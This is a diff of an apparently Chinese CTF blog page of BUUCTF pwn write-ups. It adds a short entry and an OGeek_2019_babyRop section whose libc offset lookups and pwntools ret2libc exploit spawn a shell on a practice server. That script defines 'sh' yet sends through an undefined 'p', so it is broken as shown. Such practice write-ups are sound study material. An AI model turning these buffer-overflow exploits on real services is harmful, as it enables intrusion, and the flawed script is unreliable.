@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">289</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">478</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -430,6 +430,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
 p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=remote('node3.buuoj.cn',25951)</span>
 elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_c_1'</span><span class="token punctuation">)</span>
 
 main<span class="token operator">=</span><span class="token number">0x400b28</span>
@@ -468,6 +469,51 @@ payload2 <span class="token operator">=</span> offset<span class="token operator
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice!\n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>和ciscn_2019_n_1一样，换个端口号就可以。</p>
+<h2 id="OGeek-2019-babyRop"><a href="#OGeek-2019-babyRop" class="headerlink" title="OGeek_2019_babyRop"></a>OGeek_2019_babyRop</h2><p>利用给的libc搜索函数和字符串的偏移</p>
+<pre class=" language-shell"><code class="language-shell">readelf -s libc-2.23.so | grep system@
+   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+strings -tx libc-2.23.so | grep /bin/sh
+ 15902b /bin/sh
+</code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment" spellcheck="true">#p=process('./pwn')</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25898</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/root/桌面/ctf/libc/libc-2.23.so'</span><span class="token punctuation">)</span>
+
+bin_sh_off<span class="token operator">=</span><span class="token number">0x0015902b</span>
+system_off<span class="token operator">=</span><span class="token number">0x0003a940</span>
+
+write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+main<span class="token operator">=</span><span class="token number">0x08048825</span>
+
+payload<span class="token operator">=</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">)</span>
+
+payload1<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+
+write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+libcbase <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libcbase: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> system_off
+binsh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> bin_sh_off
+
+payload<span class="token operator">=</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Correct\n'</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 
     </article>
     <!-- license  -->
@@ -475,8 +521,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         <div class="license-wrapper">
             <p>原文作者：<a href="https://meetl.github.io">Meetl</a>
             <p>原文链接：<a href="https://meetl.github.io/2019/12/29/PWN/">https://meetl.github.io/2019/12/29/PWN/</a>
-            <p>发表日期：<a href="https://meetl.github.io/2019/12/29/PWN/">December 29th 2019, 4:33:14 pm</a>
-            <p>更新日期：<a href="https://meetl.github.io/2019/12/29/PWN/">January 4th 2020, 8:12:42 pm</a>
+            <p>发表日期：<a href="https://meetl.github.io/2019/12/29/PWN/">十二月 29日 2019, 4:33:14 下午</a>
+            <p>更新日期：<a href="https://meetl.github.io/2019/12/29/PWN/">January 7th 2020, 1:13:04 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -601,7 +647,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">1.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">5.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">1.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">3.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">4.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">5.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGeek-2019-babyRop"><span class="toc-number">7.</span> <span class="toc-text">OGeek_2019_babyRop</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -707,11 +753,11 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
-    
         <span class="sidebar-tag-name" data-tags="BUUCTF pwn"><span class="iconfont-archer">&#xe606;</span>BUUCTF pwn</span>
     
         <span class="sidebar-tag-name" data-tags="学习总结"><span class="iconfont-archer">&#xe606;</span>学习总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
